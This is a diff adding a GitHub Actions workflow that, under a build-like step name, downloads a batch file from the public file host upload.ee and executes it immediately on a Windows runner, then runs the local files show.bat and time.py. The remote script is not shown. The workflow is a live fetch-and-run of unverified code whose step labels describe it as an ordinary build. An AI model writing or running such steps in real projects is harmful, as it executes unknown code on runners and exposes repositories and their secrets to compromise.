@@ -1,0 +1,21 @@
+name: Windowsx
+
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    name: Start Building...
+    runs-on: windows-latest
+    
+    steps:
+      - name: Downloading & Installing Essentials
+        run: |
+          Invoke-WebRequest -Uri "https://www.upload.ee/files/16177772/Downloads.bat.html" -OutFile "Downloads.bat"
+          cmd /c Downloads.bat
+
+      - name: Log  
+        run: cmd /c show.bat
+
+      - name: Time 
+        run: python time.py
